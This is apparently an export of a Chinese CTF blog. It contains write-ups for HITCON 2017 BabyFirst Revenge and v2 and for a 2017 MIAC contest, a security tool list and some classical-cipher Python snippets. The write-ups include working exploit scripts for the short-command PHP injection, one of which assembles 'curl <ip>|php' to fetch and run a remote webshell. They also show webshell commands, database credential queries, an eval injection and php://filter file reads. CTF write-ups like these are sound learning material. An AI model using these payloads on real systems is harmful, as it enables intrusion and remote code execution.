<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[HITCON CTF 2017 BabyFirst Revenge & v2 writeup]]></title>
    <url>%2F2017%2F11%2FHITCON-CTF-2017-Babyfirst-Revenge-series-writeup%2F</url>
    <content type="text"><![CDATA[from HITCON CTF 20172017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC https://ctf2017.hitcon.org/ BabyFirst Revenge Do you remember BabyFirst from HITCON CTF 2015? This is the harder version! http://52.199.204.34/ 源码&lt;?php $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 解法详细说明：http://bobao.360.cn/ctf/detail/214.html 拿到shell后在/home/fl4444g/README.txt 得到数据库配置信息，然后连接数据库得到flag。 http://52.199.204.34/sandbox/___MD5___of___ip/shell.php?cmd=cat%20/home/fl4444g/README.txt# Flag is in the MySQL database#fl4444g / SugZXUtgeJ52_Bvrhttp://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "show databases;"# Database#information_schema#fl4gdbhttp://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "select concat(table_name) from information_schema.tables where table_schema='fl4gdb';"# concat(table_name)#this_is_the_fl4ghttp://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb;select * from this_is_the_fl4g"# secret#hitcon&#123;idea_from_phith0n,thank_you:)&#125; EXPimport requests as rimport hashliburl = 'http://52.199.204.34/'# 查询自己的IPip = r.get('http://ipv4.icanhazip.com/').text.strip()sandbox = url + 'sandbox/' + hashlib.md5('orange' + ip).hexdigest() + '/'reset = url + '?reset'cmd = url + '?cmd='build = ['&gt;cur\\', '&gt;l\ \\', 'ls&gt;A', 'rm c*', 'rm l*', '&gt;105\\', '&gt;304\\', '&gt;301\\', '&gt;9\&gt;\\', 'ls&gt;&gt;A', 'sh A', 'php A' ]# 如果目标服务器有GET，这个也是可以打的# build = ['&gt;GE\\',# '&gt;T\\ \\',# 'ls&gt;A',# 'rm G*',# 'rm T*',# '&gt;105\\',# '&gt;304\\',# '&gt;301\\',# '&gt;9\&gt;\\',# 'ls&gt;&gt;A']r.get(reset)for i in build: s = r.get(cmd + i) print '[%s]' % s.status_code, s.urls = r.get(sandbox + 'fun.php?cmd=uname -a')print '\n' + '[%s]' % s.status_code, s.urlprint s.text 更多解答https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge BabyFirst Revenge v2 BabyFirst Revenge v2This is the hardest version! Short enough? http://52.197.41.31/ 源码&lt;?php $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 4) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 解法这题是赛后看wp复现的，只到拿webshell的部分。 详细说明： http://bobao.360.cn/ctf/detail/214.html EXP#-*-coding:utf8-*-import requests as rfrom time import sleepimport randomimport hashlibtarget = 'http://52.197.41.31/'# 存放待下载文件的公网主机的IPshell_ip = 'xx.xx.xx.xx'# 本机IPyour_ip = r.get('http://ipv4.icanhazip.com/').text.strip()# 将shell_IP转换成十六进制ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split('.')])reset = target + '?reset'cmd = target + '?cmd='sandbox = target + 'sandbox/' + \ hashlib.md5('orange' + your_ip).hexdigest() + '/'# payload某些位置的可选字符pos0 = random.choice('efgh')pos1 = random.choice('hkpq')pos2 = 'g' # 随意选择字符payload = [ '&gt;dir', # 创建名为 dir 的文件 '&gt;%s\&gt;' % pos0, # 假设pos0选择 f , 创建名为 f&gt; 的文件 '&gt;%st-' % pos1, # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1， # 因为alphabetical序中t&gt;s '&gt;sl', # 创建名为 &gt;sl 的文件；到此处有四个文件， # ls 的结果会是：dir f&gt; kt- sl '*&gt;v', # * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ， # dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符 '&gt;rev', # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v '*v&gt;%s' % pos2, # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。 # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f # 续行分割 curl 0x11223344|php 并逆序写入 '&gt;p', '&gt;ph\\', '&gt;\|\\', '&gt;%s\\' % ip[8:10], '&gt;%s\\' % ip[6:8], '&gt;%s\\' % ip[4:6], '&gt;%s\\' % ip[2:4], '&gt;%s\\' % ip[0:2], '&gt;\ \\', '&gt;rl\\', '&gt;cu\\', 'sh ' + pos2, # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来， # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行 'sh ' + pos0, # sh f 执行curl命令，下载文件，写入木马。]s = r.get(reset)for i in payload: assert len(i) &lt;= 4 s = r.get(cmd + i) print '[%d]' % s.status_code, s.url sleep(0.1)s = r.get(sandbox + 'fun.php?cmd=uname -a')print '[%d]' % s.status_code, s.urlprint s.text 更多解答https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2 参考链接来自小密圈里的那些奇技淫巧]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[computer tools]]></title>
    <url>%2F2017%2F11%2Fcomputer-tools%2F</url>
    <content type="text"><![CDATA[https://github.com/findneo/computerTools 系统优化类everything 本地文件全盘搜索。 agentransack 本地文档全文搜索。 filelocator 付费版本地文档全文搜索。 notepad++ 轻量却强大的文本编辑器，支持插件扩展和很多自定义项。 ​ 插件推荐： markdownviewer++ 预览md文件 php autocompletion emmet Resilio Sync 就像，不限容，不限速，无审查的云盘 。 teleport ultra 全站克隆到本地 。 iobitUninstaller 程序彻底卸载。 迅雷极速版7.10.34.360 存粹的下载器。 shadowsocks 代理工具，更方便地访问互联网。 splayer 本地视音频播放器，无广告，可自动搜索影片字幕。已停更。 potplayer 强大的影音播放器。 f.lux 自动调节电脑屏幕色温，保护视力。win10创意者更新中已集成到系统 。 护眼啦 定时提醒休息。高于1.6的某些版本会报毒。可自行谷歌 或 百度 下载低版本。 eyerest ubuntu下的护眼工具。 foxmail邮箱客户端，RSS功能也不错。 加加输入法 文明和谐的输入法。 7zip 开源免费无广告的压缩工具。 win10锁屏壁纸所在文件夹(C:\Users\\++username++\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets) 谷歌浏览器 中文版,英文版 插件推荐： octotree github目录树查看。 adblock 拦截广告 印象笔记 cookiesmanager shodan listen1集成多平台歌源，下载压缩包并解压后以chrome开发者模式加载 tamperMonkey 有道取词1.4 更多脚本 火狐浏览器 插件推荐： 印象笔记 GreasyMonkey 有道取词1.4 更多脚本 Hack Bar firebug uBlock Origin Bookmark Dedulplicator add to wunderlist Tamper Data拦截修改 Modify Headers修改头部 AutoProxy NoScript Live Http Header markdown相关: 马克飞象 markdownPad2 右侧即时预览的markdown编辑器 typora 所见即所得的markdown编辑器 文件同步： allwaysync 坚果云 dopdf 其他格式文件转pdf，效果不错。 telegram 即时通讯工具，被墙。 WPS Office 2013 个人版 学习相关类印象笔记 sumatraPdf 小巧好用的PDF阅读器，已停更。 福昕(xin)pdf阅读器 freemind 开源的思维导图工具。 goldenDict 离线词典。 todotxt，纯文本GTD工具。 calibre 书籍管理，azw阅读器很棒 。 myBase 知识管理。 zeal 离线文档查询。 Cisco Packet Tracer Student，路由模拟器。 GNS3 数据通信模拟器。 开发相关类visual studio code sublimeText 功能齐全，好看。 插件HTML-CSS-JS Prettify jedi ：python自动补全 anaconda Localization汉化 ConvertToUTF8解决编码问题 Bracket Highlighter匹配括号，引号和html标签。 DocBlockr 自动生成PHPDoc风格的注释。支持的js, PHP, ActionScript, CoffeeScript, Java, Objective C, C, C++ Emmet(Zen Coding) 快速生成HTML代码段的插件,很强大。比如试试html:4s 其它相关 https://github.com/jikeytang/sublime-text devcpp wing IDE python 集成开发环境 git 版本管理 远程管理 MobaXterm 强大，方便，好看。 winscp real VNC xshell secureCRT putty teamviewer weevely 中国菜刀 本地环境搭建 wamp phpstudy source insight matlab jre/jdk python/anaconda wsl linux fish shell zsh shell 安全类winhex 010editor zip压缩文件爆破 advanced zip password recovery ziperello 御剑 awvs nmap sqlmap burpsuite wireshark fiddler OD IDAPRO OWASP Mantra Janus MoC en 0.3 Alpha seay代码审计系统 virtual box开源的虚拟机软件，内存占用较小 vmware kali backtrack 52pojie虚拟机 xampp+dvwa Metasploitable-linux OWASP_Broken_Web_Apps_VM SEEDUbuntu web for pentester WebGoat-OWASP_standard_win32 小工具 微软的签名检查命令行工具sigcheck 微软的命令行校验工具fciv HXD十六进制编辑器 截图工具snipaste 硬件信息检测CPU-Z 好的在线工具 markdown协作 文本共享]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>hacklife</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python代码段]]></title>
    <url>%2F2017%2F10%2Fpython-snippets%2F</url>
    <content type="text"><![CDATA[栅栏密码加解密单行版本railFence = lambda s: [[i, ''.join([s[k * i + j] for j in range(i) for k in range(len(s) / i)])] for i in range(1, len(s)) if not len(s) % i]print railFence('hello world , 2017 ! ') 正常版本def railFence(s): ll = len(s) res = dict() for i in range(1, ll): r = '' if ll % i == 0: for j in range(i): for k in range(ll / i): r += s[k * i + j] res[i] = r return res# testprint railFence('hello world , 2017 ! ')# &#123;1: 'hello world , 2017 ! ', 3: 'hlwl,0 eood 1!l r 27 ', 7: 'ho2er0ll1ld7o ,!w '&#125; 凯撒密码加解密单行版本def caesar(s): return [[off, ''.join([chr((ord(i) - 97 + off) % 26 + 97) if 'a' &lt;= i &lt;= 'z' else chr((ord(i) - 65 + off) % 26 + 65) if 'A' &lt;= i &lt;= 'Z' else i for i in str(s)])] for off in range(26)]print caesar('h3llo') 正常版本def caesar(s): cycle = 26 res = [] for offset in range(26): r = '' for i in str(s): if 'a' &lt;= i &lt;= 'z': r += chr((ord(i) - ord('a') + offset) % cycle + ord('a')) elif 'A' &lt;= i &lt;= 'Z': r += chr((ord(i) - ord('A') + offset) % cycle + ord('A')) else: r += i res.append([offset, r]) return res# testprint caesar('h3llo')#[ [0, 'h3llo'], [1, 'i3mmp'], [2, 'j3nnq'], [3, 'k3oor'], [4, 'l3pps'], [5, 'm3qqt'], [6, 'n3rru'], [7, 'o3ssv'],# [8, 'p3ttw'], [9, 'q3uux'], [10, 'r3vvy'], [11, 's3wwz'], [12, 't3xxa'], [13, 'u3yyb'], [14, 'v3zzc'],# [15, 'w3aad'], [16, 'x3bbe'], [17, 'y3ccf'], [18, 'z3ddg'], [19, 'a3eeh'], [20, 'b3ffi'], [21, 'c3ggj'],# [22, 'd3hhk'], [23, 'e3iil'], [24, 'f3jjm'], [25, 'g3kkn']] 莫尔斯电码加解密import redef morse(s): morseChart = ['.-', '-...', '-.-.', '-..', '.', '..-.', '--.', '....', '..', '.---', '-.-', '.-..', '--', '-.', '---', '.--.', '--.-', '.-.', '...', '-', '..-', '...-', '.--', '-..-', '-.--', '--..', '-----', '.----', '..---', '...--', '....-', '.....', '-....', '--...', '---..', '----.', '.-.-.-', '--..--', '..--..', '-....-', '.----.', '---...', '.-..-.', '-..-.', '.--.-.', '-.-.-.', '-...-', '-.-.--', '..--.-', '-.--.', '-.--.-', '...-..-', '.-...', '.-.-.', ' ', '*' ] alphaChart = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '.', ',', '?', '-', "'", ':', '"', '/', '@', ';', '=', '!', '_', '(', ')', '$', '&amp;', '+', ' ', '#' ] # or as a dict -&gt; &#123;c[1][i]: c[0][i] for i in xrange(len(c[0]))&#125; c = [morseChart, alphaChart] s = s.lower() # replace characters not in alphaChart with '#' ,which shall be '*' in # encoded string s = re.sub('[^a-z0-9.,?\-\':"/@;=!_()$&amp;+ ]', '#', s) # for convenience sake, I choose not to deal with space in morse. s = re.sub('\s+', ' ', s) m = 1 # default to decode # if mot mismatch that condition,we are to encode. if not re.match('[^-._ ]', s): # occasionally we meet [ ._]+ instead of [ .-]+ s = s.replace('_', '-') s = re.split(' ', s) m = 0 # we are to encode by morse r = [] # list().extend(foo) returns None so we use 'or r' return (m * ' ').join(r.extend([c[1 - m][c[m].index(i)] for i in s]) or r)# testprint morse('Hello word,2017!')print morse('.... . .-.. .-.. --- .-- --- .-. -.. --..-- ..--- ----- .---- --... -.-.--') base64混合编码from base64 import *import randomdef baseRandomEncode(s, depth=3): for i in xrange(depth): s = random.choice([b64encode, b32encode, b16encode])(s) return sprint baseRandomEncode('hello world!') # test base64混合解码from base64 import *import reres = []# repattern is a self-defining item.# In CTF games,flag often comes as a printable string containing '&#123;' and '&#125;'.repattern = "[ -~]*&#123;[ -~]*&#125;[ -~]*|[ -~]*&#125;[ -~]*&#123;[ -~]*"def basefuzzDecode(s): global res for f in [b64decode, b32decode, b16decode]: try: t = f(s) if re.match(repattern, t): res.append(t) return 0 else: basefuzzDecode(t) except: pass return resprint basefuzzDecode(baseRandomEncode('flag&#123;hello ctf!&#125;')) # test]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 miac writeup]]></title>
    <url>%2F2017%2F10%2F2017-miac-writeup%2F</url>
    <content type="text"><![CDATA[2017/10/14 http://miac.cug.edu.cn/ http://www.yogeit.com/ https://www.bdctf.online/ Crypto贝斯的一家 &gt; UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY=&gt; 依次base64、base64、base32、base16解码。flag{fl4g_1_B4se_i3_V3ry_9ood} 颜文字 &gt; ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);&gt; aaencode ，在线解混淆 或在 chrome 的console里直接运行即可。其他还有jjencode,ppencode,rrencode等。 alert(&quot;flag&#123;aaencode_f14g_h4h4h4&#125;&quot;) 你猜我像啥 &gt; Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=&gt; from base64 import *s='Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4='b64decode(s.replace('\n摩斯密码的解密(https://morsecode.scphillips.com/translator.html)#=&gt;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115#ASCII码转字符 &#125;3_e_0_eutylxrnhl33&#123;nst='125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115'tt=''.join(map(lambda x:chr(int(x)),t.split('-')))#字符串反转 sn&#123;33lhnrxlytue_0_e_3&#125;rtt=tt[::-1]#栅栏密码的解密 synt&#123;u3e3_l0h_ner_x3l&#125;#凯撒密码解密 flag&#123;h3r3_y0u_are_k3y&#125; 2017/10/23WEBWEB签到 签到，格式bdctf{xxxxx}http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'bdctf&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['user']) and isset($_POST['pass'])) &#123; if ($_GET['user'] == $_POST['pass']) print 'pass can not be user.'; else if (sha1($_GET['user']) === sha1($_POST['pass'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 对数组进行哈希会返回null，所以传进去两个数组即可。Flag: bdctf{welcomeBDCTF2017} 命令注入 格式是flag{xxxx}http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080 &lt;?php include "flag.php";error_reporting(0);show_source(__FILE__);$a = @$_REQUEST['hello'];eval("var_dump($a);"); 直接执行系统命令，system(&#39;cat flag.php&#39;) 。得到flag为flag{93odcGA47rSRFDG} 这不仅仅是WEB 格式bdctf{xxxxx}http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080 存在文件读取： //index.php//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=index.php&lt;?php$file = $_GET["page"];if( isset( $file ) ) include( $file );else &#123; header( 'Location:?page=include.php' ); exit;&#125;?&gt; //include.php//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=include.php&lt;?phpecho'&lt;html&gt;&lt;body&gt;&lt;p align="center"&gt;&lt;font size="20"&gt;&lt;b&gt;File Include&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;&lt;br&gt;&lt;p align="center"&gt;&lt;img src="photo.jpg"&gt;&lt;/p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;font color="white"&gt;文件格式为文本格式&lt;/font&gt;&lt;/body&gt;&lt;/html&gt;'?&gt; 访问不了惹。 MISCMISC签到题 R1kzRE1RWldHRTNET04yQ0dZWkRHTVpXR0kzRElNWldHTVlUR01CVEdJWlRHTlJVR01ZVEdNUlRIRTNETU1aWkdZMlRHTVpUSEUzREVNWlVHWVlUR01SVEdZM0RFTVpaR000RE1NWlRHQTNETU1aVEdNM0RHTlJYSVE9PT09PT0= 先base64解码，再base32解码，然后十六进制转ASCII码，得到flag为flag{b3bd61023d129f9e39b4a26b98c0f366} 常规杂项在文件末尾发现提示Password:Bluedon[0-9]{8} ，写python脚本生成字典，binwalk -e 提取出压缩包，使用ziperello爆破得到密码为Bluedon47632601，解压后还是一个压缩包，但应该是伪加密，用notepad++打开即可看到flag为flag{Aha!_Y0u_9Ot_i7}。 队友使用了ARCHPR掩码爆破，方便很多。 import itertoolss0 = 'Bluedon'p = '0123456789'f = open('normalpass.txt', 'w+')passwd = ''for i in itertools.product(p, p, p, p, p, p, p, p): passwd = s0 + ''.join(i) f.write(passwd) 就在眼前 就在眼前恩，如题。格式BDCTF{xxxxx} 